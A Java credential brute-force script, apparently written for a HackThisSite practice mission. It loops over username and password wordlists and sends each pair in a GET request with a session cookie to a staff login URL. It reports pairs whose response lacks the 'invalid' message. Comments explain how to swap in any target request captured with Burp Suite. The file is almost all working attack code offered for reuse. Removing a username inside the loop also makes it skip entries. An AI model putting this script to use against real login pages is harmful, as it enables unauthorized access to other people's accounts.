/*
 * Bruteforcing Script 
 * by burchthehacker
 * 
 * Created a Java version of my Python bruteforce script.
 * 
 * How to use:
 * Go to burp suite and look at your post request in repeater. 
 * Right click on the request and "Change request method". 
 * This will change the POST request to GET. 
 * Then change the data below where I have commented // change.
 */

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Scanner;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.*;
import java.net.http.HttpResponse.BodyHandlers;

public class bruteforce {
    public static void main(String[] args) throws URISyntaxException, IOException, InterruptedException {
        ArrayList<String> username_wordlist = new ArrayList<String>();
        try {
            // change <your file path>
            File myObj = new File("<your file path>");
            Scanner myReader = new Scanner(myObj);
            while (myReader.hasNextLine()) {
                username_wordlist.add(myReader.nextLine());
            }
            myReader.close();
        } catch (FileNotFoundException e) {
            System.out.println("An error occurred.");
            e.printStackTrace();
        }
        ArrayList<String> password_wordlist = new ArrayList<String>();
        try {
            // change <your file path>
            File myObj = new File("<your file path>");
            Scanner myReader = new Scanner(myObj);
            while (myReader.hasNextLine()) {
                password_wordlist.add(myReader.nextLine());
            }
            myReader.close();
        } catch (FileNotFoundException e) {
            System.out.println("An error occurred.");
            e.printStackTrace();
        }
        ArrayList<String> found = new ArrayList<String>();

        // I changed j and i around to match python code.
        for (int j = 0; j < password_wordlist.size(); j++) {
            for (int i = 0; i < username_wordlist.size(); i++) {
                System.out.println("Attempt: " + username_wordlist.get(i) + " : " + password_wordlist.get(j));
                var url = URI.create(String.format(
                        // change the get request uri
                        "https://www.hackthissite.org/missions/realistic/10/staff.php?username=%1$s&password=%2$s",
                        username_wordlist.get(i), password_wordlist.get(j)));

                // https://www.adam-bien.com/roller/abien/entry/java_11_synchronous_http_get

                var request = HttpRequest.newBuilder(url)
                        .header("Cookie", "HackThisSite=<session cookie>") // change to add your cookies
                        .GET()
                        .build();
                var client = HttpClient.newHttpClient();

                String responseBody = client.send(request, BodyHandlers.ofString()).body();
                if (!responseBody.contains("Invalid username/password.")) {
                    System.out.println();
                    System.out.println("FOUND: " + username_wordlist.get(i) + " : " + password_wordlist.get(j));
                    System.out.println();
                    found.add(username_wordlist.get(i) + " : " + password_wordlist.get(j));
                    username_wordlist.remove(i);
                }

            }

        }
        System.out.println();
        System.out.println("Search Complete");
        System.out.println("Found credentials for: " + found);
    }
}